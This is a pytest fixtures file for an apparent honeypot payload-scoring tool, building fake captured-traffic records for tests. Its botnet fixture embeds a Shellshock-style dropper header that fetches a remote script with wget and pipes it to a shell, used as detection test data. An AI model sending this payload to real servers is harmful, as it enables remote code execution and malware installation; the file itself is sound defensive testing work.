"""Shared fixtures.

The suite runs without tshark, Elasticsearch or AWS. Anything that would reach
those is either a pure function or is exercised against a fake, so the tests
stay fast and deterministic.
"""

from __future__ import annotations

import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from deception_shield.models import PayloadRecord  # noqa: E402
from deception_shield.scoring import score_payload  # noqa: E402

BASE_TIME = datetime(2026, 9, 20, 12, 0, 0, tzinfo=timezone.utc)


def make_record(
    source_ip: str = "203.0.113.10",
    destination_port: int = 80,
    payload: bytes = b"GET / HTTP/1.1\r\n",
    *,
    minutes_offset: int = 0,
    scored: bool = True,
) -> PayloadRecord:
    """Build a record, scored the way the real pipeline would score it."""
    record = PayloadRecord(
        timestamp=BASE_TIME + timedelta(minutes=minutes_offset),
        source_ip=source_ip,
        source_port=44444,
        destination_ip="10.90.0.5",
        destination_port=destination_port,
        transport="tcp",
        payload=payload,
        sensor_id="test-sensor",
    )
    if scored:
        verdict = score_payload(payload, printable_ratio=record.printable_ratio)
        record.score = verdict.score
        record.signatures = verdict.signatures
        record.triage = verdict.triage
    return record


@pytest.fixture
def record_factory():
    return make_record


@pytest.fixture
def botnet_records() -> list[PayloadRecord]:
    """Four hosts running the same dropper, plus unrelated benign traffic."""
    dropper = b"GET /cgi-bin/x HTTP/1.1\r\nUser-Agent: () { :; }; wget http://198.18.0.9/m.sh | sh\r\n"
    records = [
        make_record(f"203.0.113.{host}", 80, dropper, minutes_offset=index)
        for index, host in enumerate(range(10, 14))
    ]
    records += [
        make_record("198.51.100.20", 443, b"GET /healthz HTTP/1.1\r\n", minutes_offset=2),
        make_record("198.51.100.21", 443, b"GET /status HTTP/1.1\r\n", minutes_offset=3),
    ]
    return records


@pytest.fixture
def sweep_records() -> list[PayloadRecord]:
    """One host touching many ports in quick succession."""
    return [
        make_record("192.0.2.55", port, b"\x00\x01\x02\x03", minutes_offset=index % 5)
        for index, port in enumerate(range(9000, 9030))
    ]
